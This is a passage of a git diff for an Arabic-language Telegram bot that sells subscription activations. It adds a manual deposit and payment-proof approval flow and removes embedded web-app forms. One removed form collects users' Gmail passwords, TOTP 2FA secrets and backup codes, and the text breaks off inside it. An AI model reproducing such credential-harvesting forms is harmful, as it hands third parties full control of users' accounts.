@@ -34,12 +34,23 @@ def get_settings():
             "price_yt": 15, 
             "price_spotify": 15, 
             "price_gemini": 15, 
-            "referral_bonus": 2
+            "referral_bonus": 2,
+            "point_price_sar": 1.0,
+            "point_price_yer": 100.0,
+            "points_per_usdt": 15.0
         }
         settings_collection.insert_one(s)
+    
+    # ضمان وجود مفاتيح أسعار الشحن في حال كانت البيانات قديمة
+    needs_update = False
+    if "point_price_sar" not in s: s["point_price_sar"] = 1.0; needs_update = True
+    if "point_price_yer" not in s: s["point_price_yer"] = 100.0; needs_update = True
+    if "points_per_usdt" not in s: s["points_per_usdt"] = 15.0; needs_update = True
+    if needs_update: settings_collection.update_one({"_id": "bot_settings"}, {"$set": s})
     return s
 
 admin_states = {}
+user_states = {} # لتتبع حالة إدخال المبالغ والصور للعملاء
 
 # --- تتبع الفلود والسبام ---
 user_flood_tracker = {}
@@ -80,8 +91,11 @@ def admin_keyboard():
     markup.add(KeyboardButton("📩 رد/رسالة لمستخدم"), KeyboardButton("📢 إذاعة للجميع"))
     markup.add(KeyboardButton("📺 سعر يوتيوب"), KeyboardButton("🎵 سعر سبوتيفاي"))
     markup.add(KeyboardButton("✨ سعر جيميناي"), KeyboardButton("🎁 تعديل مكافأة الدعوة"))
-    markup.add(KeyboardButton("📊 إحصائيات المستخدمين"), KeyboardButton("🚫 قائمة المحظورين"))
-    markup.add(KeyboardButton("🔍 استعلام عن مستخدم"), KeyboardButton(BTN_MAIN))
+    # أزرار ضبط أسعار الإيداع
+    markup.add(KeyboardButton("⚙️ تعديل سعر النقطة (SAR)"), KeyboardButton("⚙️ تعديل سعر النقطة (YER)"))
+    markup.add(KeyboardButton("⚙️ تعديل سعر النقطة (USDT)"), KeyboardButton("📊 إحصائيات المستخدمين"))
+    markup.add(KeyboardButton("🔍 استعلام عن مستخدم"), KeyboardButton("🚫 قائمة المحظورين"))
+    markup.add(KeyboardButton(BTN_MAIN))
     return markup
 
 def check_user_subscription(user_id):
@@ -234,6 +248,129 @@ def handle_reply_button(call):
         admin_states[call.from_user.id] = {'action': 'reply_user', 'target': target_id}
         bot.send_message(ADMIN_ID, f"✍️ <b>وضع الرد مفعل:</b>\nاكتب رسالتك الآن للعميل: <code>{target_id}</code>\n\n(لإلغاء الأمر أرسل /cancel)")
         bot.answer_callback_query(call.id)
+
+# ==========================================
+# --- نظام الإيداع والشحن الآلي المتقدم ---
+# ==========================================
+@bot.callback_query_handler(func=lambda call: call.data.startswith('dep_method_'))
+def handle_deposit_method(call):
+    user_id = call.from_user.id
+    method = call.data.split('_')[2]
+    settings = get_settings()
+    sar_price = settings.get("point_price_sar", 1.0)
+    yer_price = settings.get("point_price_yer", 100.0)
+    usdt_pts = settings.get("points_per_usdt", 15.0)
+
+    min_money = 0; min_pts = 0; currency = ""
+    if method == "sar":
+        min_money = 10.0; min_pts = int(10.0 / sar_price) if sar_price > 0 else 10; currency = "SAR"
+    elif method == "yer":
+        min_money = 2000.0; min_pts = int(2000.0 / yer_price) if yer_price > 0 else 2000; currency = "YER"
+    elif method in ["paypal", "binance"]:
+        min_money = 1.0; min_pts = int(usdt_pts); currency = "USDT"
+
+    msg = (
+        f"📌 <b>الحد الأدنى للإيداع:</b> {min_pts} نقطة (يُعادل {min_money:g} {currency})\n\n"
+        "أرسل الآن <b>رقماً فقط</b> يمثل إما <b>عدد النقاط</b> التي تريد شراءها، أو <b>المبلغ</b> الذي تريد إيداعه، وسنقوم بحسابه تلقائياً."
+    )
+    user_states[user_id] = {'state': 'waiting_deposit_amount', 'method': method, 'currency': currency, 'min_pts': min_pts, 'min_money': min_money}
+    bot.send_message(user_id, msg, parse_mode="HTML")
+    bot.answer_callback_query(call.id)
+
+@bot.callback_query_handler(func=lambda call: call.data.startswith('dep_val_'))
+def handle_deposit_value(call):
+    user_id = call.from_user.id
+    parts = call.data.split('_')
+    method = parts[2]
+    val_type = parts[3]
+    val = float(parts[4])
+
+    settings = get_settings()
+    sar_price = settings.get("point_price_sar", 1.0)
+    yer_price = settings.get("point_price_yer", 100.0)
+    usdt_pts = settings.get("points_per_usdt", 15.0)
+
+    min_money, min_pts, currency, rate = 0, 0, "", 1
+    if method == "sar": min_money, min_pts, currency, rate = 10, int(10/sar_price) if sar_price else 10, "SAR", sar_price
+    elif method == "yer": min_money, min_pts, currency, rate = 2000, int(2000/yer_price) if yer_price else 2000, "YER", yer_price
+    elif method in ["paypal", "binance"]: min_money, min_pts, currency, rate = 1, usdt_pts, "USDT", 1/usdt_pts if usdt_pts else 1
+
+    if val_type == "pts":
+        pts = int(val)
+        money = pts * rate
+    else:
+        money = val
+        pts = int(money / rate) if rate else 0
+
+    if money < min_money or pts < min_pts:
+        bot.answer_callback_query(call.id, f"⚠️ عذراً، الحد الأدنى هو {min_money:g} {currency} ({min_pts} نقطة).", show_alert=True)
+        return
+
+    msg = (
+        f"✅ <b>تم الحساب بنجاح:</b>\n"
+        f"▪️ عدد النقاط: <b>{pts}</b> نقطة\n"
+        f"▪️ إجمالي المبلغ المطلوب: <b>{money:g}</b> {currency}\n\n"
+        "يرجى اتباع تعليمات التحويل الموجودة أسفل بيانات الدفع."
+    )
+    markup = InlineKeyboardMarkup()
+    markup.add(InlineKeyboardButton("✅ متابعة", callback_data=f"dep_cont_{method}_{pts}_{money}"))
+    bot.edit_message_text(msg, chat_id=user_id, message_id=call.message.message_id, parse_mode="HTML", reply_markup=markup)
+
+@bot.callback_query_handler(func=lambda call: call.data.startswith('dep_cont_'))
+def handle_deposit_continue(call):
+    user_id = call.from_user.id
+    parts = call.data.split('_')
+    method = parts[2]
+    pts = parts[3]
+    money = parts[4]
+
+    details = ""
+    if method == "sar": details = "💳 <b>الدفع السعودي</b>\nأودع المبلغ إلى الحساب التالي:\n<code>SA123456789</code>"
+    elif method == "yer": details = "💳 <b>الدفع اليمني</b>\nأودع المبلغ إلى الحساب التالي:\n<code>YE123456789</code>"
+    elif method == "binance": details = "💳 <b>الدفع عبر Binance</b>\nأرسل المبلغ إلى المعرف التالي:\n<code>BE1234567</code>"
+    elif method == "paypal": details = "💳 <b>الدفع عبر PayPal</b>\nأرسل المبلغ إلى الحساب التالي:\n<code>Bay123458</code>"
+
+    msg = f"{details}\n\nيرجى تحويل المبلغ بدقة، ثم الضغط على الزر أدناه لرفع صورة الحوالة."
+    markup = InlineKeyboardMarkup()
+    markup.add(InlineKeyboardButton("📤 رفع إثبات الدفع", callback_data=f"dep_proof_{method}_{pts}_{money}"))
+    bot.edit_message_text(msg, chat_id=user_id, message_id=call.message.message_id, parse_mode="HTML", reply_markup=markup)
+
+@bot.callback_query_handler(func=lambda call: call.data.startswith('dep_proof_'))
+def handle_deposit_proof(call):
+    user_id = call.from_user.id
+    parts = call.data.split('_')
+    user_states[user_id] = {'state': 'waiting_deposit_proof', 'method': parts[2], 'pts': parts[3], 'money': parts[4]}
+    bot.send_message(user_id, "📸 <b>يرجى إرسال لقطة شاشة (صورة) لإثبات الدفع الآن:</b>", parse_mode="HTML")
+    bot.answer_callback_query(call.id)
+
+@bot.callback_query_handler(func=lambda call: call.data.startswith('dep_admin_'))
+def handle_admin_deposit_action(call):
+    if str(call.from_user.id) != str(ADMIN_ID):
+        return bot.answer_callback_query(call.id, "⛔️ للآدمن فقط!", show_alert=True)
+    
+    parts = call.data.split('_')
+    action = parts[2]
+    target_id = int(parts[3])
+
+    if action == 'app':
+        pts = int(parts[4])
+        users_collection.update_one({"user_id": target_id}, {"$inc": {"points": pts}})
+        try: bot.send_message(target_id, f"🎉 <b>تم اعتماد عملية الدفع بنجاح!</b>\n\nتمت إضافة <b>{pts}</b> نقطة إلى رصيدك. نشكر لك ثقتك بنا! 🚀", parse_mode="HTML")
+        except: pass
+        bot.edit_message_caption(f"{call.message.caption}\n\n✅ <b>تم التأكيد وإضافة النقاط.</b>", chat_id=call.message.chat.id, message_id=call.message.message_id, parse_mode="HTML")
+    
+    elif action == 'rej':
+        try: bot.send_message(target_id, "⚠️ <b>تعذر اعتماد عملية الدفع.</b>\n\nيرجى مراجعة بيانات التحويل والتأكد من صحة عملية الدفع، ثم إرسال إثبات جديد حتى نتمكن من مراجعة الطلب مرة أخرى.", parse_mode="HTML")
+        except: pass
+        bot.edit_message_caption(f"{call.message.caption}\n\n❌ <b>تم رفض الطلب.</b>", chat_id=call.message.chat.id, message_id=call.message.message_id, parse_mode="HTML")
+
+    elif action == 'wait':
+        track_id = f"A{datetime.datetime.now().strftime('%Y%m%d%H%M%S')}"
+        try: bot.send_message(target_id, f"⏳ <b>تم استلام طلبك وهو قيد المراجعة.</b>\n\nنظرًا لوجود ضغط في الطلبات، يرجى الانتظار حتى يتم التحقق من عملية الدفع.\n\nرقم الطلب: <code>{track_id}</code>", parse_mode="HTML")
+        except: pass
+        bot.edit_message_caption(f"{call.message.caption}\n\n⏳ <b>تم وضع الطلب في الانتظار. رقم الطلب: {track_id}</b>", chat_id=call.message.chat.id, message_id=call.message.message_id, parse_mode="HTML")
+    
+    bot.answer_callback_query(call.id, "تم التنفيذ.")
 
 # ==========================================
 # --- نظام الحماية المتقدم للمجموعات ---
@@ -421,12 +558,76 @@ def process_group_buttons(message):
         resp = bot.send_message(message.chat.id, account_msg, parse_mode="HTML")
         delayed_delete(message.chat.id, message.message_id, resp.message_id, 3.0)
 
+# --- استلام الصور (لإثبات الدفع) ---
+@bot.message_handler(content_types=['photo'])
+def handle_photo(message):
+    user_id = message.from_user.id
+    is_admin = (str(user_id) == str(ADMIN_ID))
+
+    if message.chat.type in ['group', 'supergroup']:
+        advanced_group_moderation(message)
+        return
+
+    if not is_admin and user_id in user_states and user_states[user_id].get('state') == 'waiting_deposit_proof':
+        state_info = user_states[user_id]
+        method = state_info['method']
+        pts = state_info['pts']
+        money = state_info['money']
+        
+        bot.send_message(user_id, "⏳ <b>جاري التحقق من عملية الدفع...</b>\n\nسيتم شحن حسابك تلقائيًا فور اعتماد عملية الإيداع.\nيرجى الانتظار.", parse_mode="HTML")
+        del user_states[user_id]
+
+        if ADMIN_ID:
+            photo_file_id = message.photo[-1].file_id
+            now_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            admin_msg = (
+                f"🔔 <b>طلب إيداع/شحن جديد!</b>\n\n"
+                f"👤 الاسم: {message.from_user.first_name}\n"
+                f"🆔 الآيدي: <code>{user_id}</code>\n"
+                f"💳 وسيلة الدفع: {method.upper()}\n"
+                f"💵 المبلغ المدفوع: {money}\n"
+                f"🪙 النقاط المطلوبة: {pts}\n"
+                f"⏰ الوقت: {now_time}\n"
+            )
+            markup = InlineKeyboardMarkup(row_width=2)
+            markup.add(
+                InlineKeyboardButton("✅ تأكيد", callback_data=f"dep_admin_app_{user_id}_{pts}"),
+                InlineKeyboardButton("❌ رفض", callback_data=f"dep_admin_rej_{user_id}")
+            )
+            markup.add(InlineKeyboardButton("⏳ انتظار", callback_data=f"dep_admin_wait_{user_id}"))
+            
+            try: bot.send_photo(ADMIN_ID, photo_file_id, caption=admin_msg, reply_markup=markup, parse_mode="HTML")
+            except: pass
+
 # --- معالجة النصوص (العملاء في الخاص والإدارة) ---
 @bot.message_handler(func=lambda message: message.chat.type == 'private')
 def handle_private_text(message):
     user_id = message.from_user.id
     text = message.text
     is_admin = (str(user_id) == str(ADMIN_ID))
+
+    # التقاط حالة إدخال مبلغ الإيداع للعميل
+    if not is_admin and user_id in user_states and user_states[user_id].get('state') == 'waiting_deposit_amount':
+        if text in [BTN_YT, BTN_SPOTIFY, BTN_GEMINI, BTN_DAILY, BTN_DEPOSIT, BTN_CONTACT, BTN_ACCOUNT, BTN_INVITE, BTN_HELP, BTN_GUIDE, BTN_MAIN]:
+            del user_states[user_id]
+        else:
+            state_info = user_states[user_id]
+            try:
+                val = float(text)
+            except:
+                bot.send_message(user_id, "⚠️ يرجى إرسال أرقام فقط للحساب.")
+                return
+            
+            method = state_info['method']
+            currency = state_info['currency']
+            markup = InlineKeyboardMarkup(row_width=2)
+            markup.add(
+                InlineKeyboardButton(f"🪙 {val:g} نقطة", callback_data=f"dep_val_{method}_pts_{val:g}"),
+                InlineKeyboardButton(f"💵 {val:g} {currency}", callback_data=f"dep_val_{method}_mon_{val:g}")
+            )
+            bot.send_message(user_id, f"الرقم المدخل: <b>{val:g}</b>\n\nهل هذا الرقم يمثل عدد النقاط المطلوبة أم المبلغ بـ {currency}؟", reply_markup=markup, parse_mode="HTML")
+            del user_states[user_id]
+            return
 
     if is_admin and user_id in admin_states:
         if text == '/cancel':
@@ -479,6 +680,7 @@ def handle_private_text(message):
                     except: pass
                 bot.send_message(user_id, f"✅ تمت الإذاعة بنجاح لـ {count} مستخدم.", reply_markup=admin_keyboard())
             
+            # --- تعديل أسعار الخدمات ---
             elif action == 'change_price_yt':
                 new_price = int(text)
                 settings_collection.update_one({"_id": "bot_settings"}, {"$set": {"price_yt": new_price}})
@@ -513,6 +715,21 @@ def handle_private_text(message):
                 new_ref = int(text)
                 settings_collection.update_one({"_id": "bot_settings"}, {"$set": {"referral_bonus": new_ref}})
                 bot.send_message(user_id, f"✅ تم تغيير مكافأة الدعوة إلى {new_ref} نقطة.", reply_markup=admin_keyboard())
+            
+            # --- تعديل أسعار الشحن من لوحة الإدارة ---
+            elif action == 'set_price_sar':
+                new_val = float(text.replace(',', '.'))
+                settings_collection.update_one({"_id": "bot_settings"}, {"$set": {"point_price_sar": new_val}})
+                bot.send_message(user_id, f"✅ تم التحديث. سعر النقطة الآن {new_val} SAR.", reply_markup=admin_keyboard())
+            elif action == 'set_price_yer':
+                new_val = float(text.replace(',', '.'))
+                settings_collection.update_one({"_id": "bot_settings"}, {"$set": {"point_price_yer": new_val}})
+                bot.send_message(user_id, f"✅ تم التحديث. سعر النقطة الآن {new_val} YER.", reply_markup=admin_keyboard())
+            elif action == 'set_price_usdt':
+                new_val = float(text.replace(',', '.'))
+                settings_collection.update_one({"_id": "bot_settings"}, {"$set": {"points_per_usdt": new_val}})
+                bot.send_message(user_id, f"✅ تم التحديث. 1 USDT يعادل الآن {new_val} نقطة.", reply_markup=admin_keyboard())
+
             elif action == 'check_user':
                 target_id = int(text)
                 target_user = users_collection.find_one({"user_id": target_id})
@@ -556,6 +773,21 @@ def handle_private_text(message):
             admin_states[user_id] = {'action': 'change_price_gemini'}; bot.send_message(user_id, "أرسل السعر الجديد لخدمة جيميناي (رقم فقط):"); return
         elif text == "🎁 تعديل مكافأة الدعوة":
             admin_states[user_id] = {'action': 'change_referral'}; bot.send_message(user_id, "أرسل نقاط المكافأة الجديدة لدعوة الأصدقاء (رقم فقط):"); return
+        
+        # أزرار الإيداع الجديدة
+        elif text == "⚙️ تعديل سعر النقطة (SAR)":
+            admin_states[user_id] = {'action': 'set_price_sar'}
+            bot.send_message(user_id, "أرسل سعر النقطة الواحدة بالريال السعودي (مثال: 1 أو 0.5):")
+            return
+        elif text == "⚙️ تعديل سعر النقطة (YER)":
+            admin_states[user_id] = {'action': 'set_price_yer'}
+            bot.send_message(user_id, "أرسل سعر النقطة الواحدة بالريال اليمني (مثال: 100):")
+            return
+        elif text == "⚙️ تعديل سعر النقطة (USDT)":
+            admin_states[user_id] = {'action': 'set_price_usdt'}
+            bot.send_message(user_id, "أرسل عدد النقاط التي يحصل عليها العميل مقابل كل 1 USDT (مثال: 15):")
+            return
+
         elif text == "🔍 استعلام عن مستخدم":
             admin_states[user_id] = {'action': 'check_user'}; bot.send_message(user_id, "أرسل ID العميل للاستعلام عن بياناته وحسابه:"); return
         elif text == "📊 إحصائيات المستخدمين":
@@ -610,6 +842,7 @@ def handle_private_text(message):
     bot_settings = get_settings()
     ref_bonus = bot_settings.get("referral_bonus", 2)
 
+    # تفاعلات الخاص فقط 
     if text == BTN_DAILY:
         today_str = datetime.datetime.now().strftime("%Y-%m-%d")
         yesterday_str = (datetime.datetime.now() - datetime.timedelta(days=1)).strftime("%Y-%m-%d")
@@ -654,6 +887,29 @@ def handle_private_text(message):
     elif text == BTN_CONTACT:
         bot.send_message(user_id, "💬 للتواصل المباشر مع الإدارة:\n\n<a href='https://t.me/bdallhshay7'>اضغط هنا للتواصل مع الدعم</a>", parse_mode="HTML")
 
+    elif text == BTN_DEPOSIT:
+        sar_price = bot_settings.get("point_price_sar", 1.0)
+        yer_price = bot_settings.get("point_price_yer", 100.0)
+        usdt_pts = bot_settings.get("points_per_usdt", 15.0)
+
+        msg = (
+            "💳 <b>تعليمات الإيداع</b>\n\n"
+            "📊 <b>سعر الصرف:</b>\n"
+            f"▪️ 1 نقطة = {sar_price:g} SAR\n"
+            f"▪️ 1 نقطة = {yer_price:g} YER\n"
+            f"▪️ 1 USDT = {usdt_pts:g} نقطة\n\n"
+            "⚠️ <b>ملاحظة:</b>\n"
+            "• جميع عمليات الإيداع عبر Binance أو PayPal غير قابلة للاسترداد بعد تنفيذ عملية الدفع."
+        )
+        markup = InlineKeyboardMarkup(row_width=2)
+        markup.add(
+            InlineKeyboardButton("💳 دفع سعودي", callback_data="dep_method_sar"),
+            InlineKeyboardButton("💳 دفع يمني", callback_data="dep_method_yer"),
+            InlineKeyboardButton("💳 PayPal", callback_data="dep_method_paypal"),
+            InlineKeyboardButton("💳 Binance", callback_data="dep_method_binance")
+        )
+        bot.send_message(user_id, msg, reply_markup=markup, parse_mode="HTML")
+
     elif text in [BTN_YT, BTN_SPOTIFY, BTN_GEMINI]:
         points = user.get("points", 0)
         price_map = {BTN_YT: bot_settings.get("price_yt", 15), BTN_SPOTIFY: bot_settings.get("price_spotify", 15), BTN_GEMINI: bot_settings.get("price_gemini", 15)}
@@ -692,332 +948,8 @@ def handle_private_text(message):
         else:
             bot.send_message(user_id, f"😔 <b>عذراً، رصيدك غير كافٍ.</b>\nرصيدك: {points} نقطة.\nالمطلوب: {service_price} نقطة.")
 
-    elif text in [BTN_HELP, BTN_GUIDE, BTN_DEPOSIT]:
+    elif text in [BTN_HELP, BTN_GUIDE]:
         bot.send_message(user_id, "⏳ سيتم إضافة المحتوى قريباً...")
-
-# ==========================================
-# --- أكواد ونماذج HTML المدمجة بالسيرفر ---
-# ==========================================
-
-@app.route('/youtube.html')
-def youtube_form():
-    return '''
-    <!DOCTYPE html>
-    <html dir="rtl">
-    <head>
-        <meta charset="utf-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-        <script src="https://telegram.org/js/telegram-web-app.js"></script>
-        <style>
-            body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f9f9f9; text-align: center; padding: 20px; color: #333; margin: 0; }
-            .card { background: white; padding: 30px 20px; border-radius: 16px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); margin-top: 20px; }
-            h2 { color: #333; margin-top: 0; display: flex; align-items: center; justify-content: center; gap: 8px;}
-            p { color: #666; font-size: 15px; margin-bottom: 25px; }
-            input { width: 100%; padding: 15px; margin-bottom: 10px; border: 1.5px solid #eee; border-radius: 10px; font-size: 16px; box-sizing: border-box; transition: 0.3s; text-align: left; direction: ltr; }
-            input:focus { border-color: #FF0000; outline: none; }
-            button { background-color: #FF0000; color: white; border: none; padding: 15px; border-radius: 10px; font-size: 16px; font-weight: bold; width: 100%; cursor: pointer; box-shadow: 0 4px 6px rgba(255,0,0,0.2); margin-top: 10px; }
-            button:disabled { background-color: #ccc; cursor: not-allowed; }
-            @keyframes shake { 0%, 100% {transform: translateX(0);} 25% {transform: translateX(-5px);} 50% {transform: translateX(5px);} 75% {transform: translateX(-5px);} }
-            .input-error { border-color: #FF0000 !important; background-color: #ffe6e6 !important; animation: shake 0.4s; }
-            .error-msg { color: #FF0000; font-size: 12px; font-weight: bold; margin-bottom: 15px; display: none; text-align: right; }
-        </style>
-    </head>
-    <body>
-        <div class="card">
-            <h2>يوتيوب بريميوم 📺</h2>
-            <p>يرجى لصق رابط التحقق والدفع الخاص بك في الأسفل:</p>
-            <input type="url" id="link" placeholder="https://offers.sheerid.com/..." oninput="clearError('link')">
-            <div id="link-error" class="error-msg"></div>
-            <button id="submitBtn" onclick="sendData()">تأكيد وطلب التفعيل</button>
-        </div>
-        <script>
-            let tg = window.Telegram.WebApp;
-            tg.expand();
-            const urlParams = new URLSearchParams(window.location.search);
-            const uid = urlParams.get('uid'); 
-            const msg_id = urlParams.get('msg_id');
-
-            function clearError(id) {
-                document.getElementById(id).classList.remove('input-error');
-                document.getElementById(id + '-error').style.display = 'none';
-            }
-            function showError(id, msg) {
-                let el = document.getElementById(id);
-                el.classList.add('input-error');
-                let errEl = document.getElementById(id + '-error');
-                errEl.innerText = msg; errEl.style.display = 'block';
-                setTimeout(() => el.classList.remove('input-error'), 400);
-            }
-
-            function sendData() {
-                let link = document.getElementById('link').value.trim();
-                let hasArabic = /[\u0600-\u06FF]/.test(link);
-                
-                if(!link.startsWith("https://offers.sheerid.com/") || hasArabic) { 
-                    let msg = hasArabic ? "⚠️ عذراً، لا يُسمح باستخدام الحروف العربية" : "⚠️ عذراً، يجب أن يبدأ الرابط بـ https://offers.sheerid.com/";
-                    showError('link', msg); return; 
-                }
-                
-                document.getElementById('submitBtn').disabled = true;
-                document.getElementById('submitBtn').innerText = "جاري الإرسال...";
-                fetch('/submit_form', {
-                    method: 'POST', headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({uid: uid, msg_id: msg_id, service: 'youtube', dataString: "الخدمة: يوتيوب بريميوم \\nالرابط: " + link})
-                }).then(() => tg.close()).catch(() => {
-                    alert("حدث خطأ أثناء الإرسال.");
-                    document.getElementById('submitBtn').disabled = false;
-                    document.getElementById('submitBtn').innerText = "تأكيد وطلب التفعيل";
-                });
-            }
-        </script>
-    </body>
-    </html>
-    '''
-
-@app.route('/spotify.html')
-def spotify_form():
-    return '''
-    <!DOCTYPE html>
-    <html dir="rtl">
-    <head>
-        <meta charset="utf-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-        <script src="https://telegram.org/js/telegram-web-app.js"></script>
-        <style>
-            body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f9f9f9; text-align: center; padding: 20px; color: #333; margin: 0; }
-            .card { background: white; padding: 30px 20px; border-radius: 16px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); margin-top: 20px; }
-            h2 { color: #333; margin-top: 0; display: flex; align-items: center; justify-content: center; gap: 8px;}
-            p { color: #666; font-size: 15px; margin-bottom: 25px; }
-            input { width: 100%; padding: 15px; margin-bottom: 10px; border: 1.5px solid #eee; border-radius: 10px; font-size: 16px; box-sizing: border-box; transition: 0.3s; text-align: left; direction: ltr; }
-            input:focus { border-color: #1DB954; outline: none; }
-            button { background-color: #1DB954; color: white; border: none; padding: 15px; border-radius: 10px; font-size: 16px; font-weight: bold; width: 100%; cursor: pointer; box-shadow: 0 4px 6px rgba(29,185,84,0.2); margin-top: 10px;}
-            button:disabled { background-color: #ccc; cursor: not-allowed; }
-            @keyframes shake { 0%, 100% {transform: translateX(0);} 25% {transform: translateX(-5px);} 50% {transform: translateX(5px);} 75% {transform: translateX(-5px);} }
-            .input-error { border-color: #FF0000 !important; background-color: #ffe6e6 !important; animation: shake 0.4s; }
-            .error-msg { color: #FF0000; font-size: 12px; font-weight: bold; margin-bottom: 15px; display: none; text-align: right; }
-        </style>
-    </head>
-    <body>
-        <div class="card">
-            <h2>سبوتيفاي بريميوم 🎵</h2>
-            <p>يرجى لصق رابط التحقق والدفع الخاص بك في الأسفل:</p>
-            <input type="url" id="link" placeholder="https://offers.sheerid.com/..." oninput="clearError('link')">
-            <div id="link-error" class="error-msg"></div>
-            <button id="submitBtn" onclick="sendData()">تأكيد وطلب التفعيل</button>
-        </div>
-        <script>
-            let tg = window.Telegram.WebApp;
-            tg.expand();
-            const urlParams = new URLSearchParams(window.location.search);
-            const uid = urlParams.get('uid'); const msg_id = urlParams.get('msg_id');
-            
-            function clearError(id) {
-                document.getElementById(id).classList.remove('input-error');
-                document.getElementById(id + '-error').style.display = 'none';
-            }
-            function showError(id, msg) {
-                let el = document.getElementById(id);
-                el.classList.add('input-error');
-                let errEl = document.getElementById(id + '-error');
-                errEl.innerText = msg; errEl.style.display = 'block';
-                setTimeout(() => el.classList.remove('input-error'), 400);
-            }
-
-            function sendData() {
-                let link = document.getElementById('link').value.trim();
-                let hasArabic = /[\u0600-\u06FF]/.test(link);
-                
-                if(!link.startsWith("https://offers.sheerid.com/") || hasArabic) { 
-                    let msg = hasArabic ? "⚠️ عذراً، لا يُسمح باستخدام الحروف العربية" : "⚠️ عذراً، يجب أن يبدأ الرابط بـ https://offers.sheerid.com/";
-                    showError('link', msg); return; 
-                }
-                
-                document.getElementById('submitBtn').disabled = true;
-                document.getElementById('submitBtn').innerText = "جاري الإرسال...";
-                fetch('/submit_form', {
-                    method: 'POST', headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({uid: uid, msg_id: msg_id, service: 'spotify', dataString: "الخدمة: سبوتيفاي بريميوم \\nالرابط: " + link})
-                }).then(() => tg.close()).catch(() => {
-                    alert("حدث خطأ أثناء الإرسال.");
-                    document.getElementById('submitBtn').disabled = false;
-                    document.getElementById('submitBtn').innerText = "تأكيد وطلب التفعيل";
-                });
-            }
-        </script>
-    </body>
-    </html>
-    '''
-
-@app.route('/gemini.html')
-def gemini_form():
-    return '''
-    <!DOCTYPE html>
-    <html dir="rtl">
-    <head>
-        <meta charset="utf-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-        <script src="https://telegram.org/js/telegram-web-app.js"></script>
-        <style>
-            body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 0; background-color: #f0f2f5; color: #333; }
-            .header { background-color: #0f9d58; color: white; padding: 25px 20px; text-align: right; border-bottom-left-radius: 15px; border-bottom-right-radius: 15px;}
-            .header h2 { margin: 0; font-size: 26px; display: flex; align-items: center; justify-content: flex-start; gap: 10px; }
-            .header p { margin: 5px 0 0; font-size: 15px; opacity: 0.9; }
-            .badge { display: inline-block; background: rgba(255,255,255,0.2); padding: 5px 12px; border-radius: 15px; font-size: 13px; margin-top: 15px; }
-            .form-container { background: white; margin: -15px 15px 20px; padding: 25px 20px; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.08); position: relative; z-index: 1; }
-            .form-group { margin-bottom: 22px; text-align: right; }
-            .section-title { font-size: 14px; color: #0f9d58; margin-bottom: 15px; font-weight: bold; border-bottom: 1px solid #eee; padding-bottom: 5px;}
-            .form-group label { display: block; margin-bottom: 8px; font-weight: bold; font-size: 13px; color: #555; }
-            .input-wrapper { position: relative; }
-            input, textarea { width: 100%; padding: 14px; border: 1.5px solid #e0e0e0; border-radius: 8px; font-size: 15px; box-sizing: border-box; font-family: inherit; transition: 0.3s; background-color: #fafafa;}
-            input:focus, textarea:focus { outline: none; border-color: #0f9d58; background-color: white;}
-            .toggle-password { position: absolute; left: 15px; top: 50%; transform: translateY(-50%); cursor: pointer; color: #888; font-size: 18px;}
-            .helper-text { font-size: 11px; color: #888; margin-top: 8px; display: block; line-height: 1.4;}
-            .submit-btn { background-color: #0f9d58; color: white; border: none; padding: 16px; border-radius: 8px; font-size: 16px; cursor: pointer; width: 100%; font-weight: bold; display: flex; align-items: center; justify-content: center; margin-top: 10px;}
-            .submit-btn:disabled { background-color: #ccc; cursor: not-allowed; }
-            .footer-note { text-align: center; font-size: 11px; color: #aaa; margin-top: 20px; }
-            @keyframes shake { 0%, 100% {transform: translateX(0);} 25% {transform: translateX(-5px);} 50% {transform: translateX(5px);} 75% {transform: translateX(-5px);} }
-            .input-error { border-color: #ff3333 !important; background-color: #ffe6e6 !important; animation: shake 0.4s; }
-            .error-msg { color: #ff3333; font-size: 11.5px; font-weight: bold; margin-top: 5px; margin-bottom: 5px; display: none; }
-        </style>
-    </head>
-    <body>
-        <div class="header">
-            <h2>أتمتة الباقات</h2>
-            <p>لتفعيل Google One - Gemini Pro املأ المعلومات</p>
-            <div class="badge">⭐ <span id="userPoints">0</span></div>
-        </div>
-        <div class="form-container">
-            <div class="section-title">👤 حساب جوجل</div>
-            
-            <div class="form-group">
-                <label>Gmail عنوان</label>
-                <input type="email" id="email" placeholder="example@gmail.com" oninput="clearError('email')">
-                <div id="email-error" class="error-msg"></div>
-            </div>
-            
-            <div class="form-group">
-                <label>كلمة مرور جيميل</label>
-                <div class="input-wrapper">
-                    <input type="password" id="password" placeholder="الخاصة بك Gmail أدخل كلمة مرور" oninput="clearError('password')">
-                    <span class="toggle-password" onclick="togglePwd()">👁️</span>
-                </div>
-                <div id="password-error" class="error-msg"></div>
-            </div>
-            
-            <div class="section-title" style="margin-top: 30px;">🔓 المصادقة الثنائية</div>
-            
-            <div class="form-group">
-                <label>سر المصادقة الثنائية (TOTP)</label>
-                <input type="text" id="totp" placeholder="على سبيل المثال: JBSWY3DPEHPK3PXP" oninput="clearError('totp')">
-                <div id="totp-error" class="error-msg"></div>
-                <span class="helper-text">ℹ️ Base32 حرفًا 32 :Google Authenticator المفتاح السري من (والأرقام من 2 إلى 7 Z إلى A الحروف من) بالضبط.</span>
-            </div>
-            
-            <div class="form-group">
-                <label>رموز النسخ الاحتياطي <span style="color:#aaa; font-weight:normal;">(خيار)</span></label>
-                <textarea id="backup" rows="3" placeholder="سطر واحد من التعليمات البرمجية في كل سطر..." oninput="clearError('backup')"></textarea>
-                <div id="backup-error" class="error-msg"></div>
-                <span class="helper-text">ℹ️ رمز واحد في كل سطر، 2-3 رموز مطلوبة؛ يتكون كل رمز من 8 أرقام بالضبط.</span>
-            </div>
-            
-            <button id="submitBtn" class="submit-btn" onclick="sendData()">تأكيد وتفعيل ⚡</button>
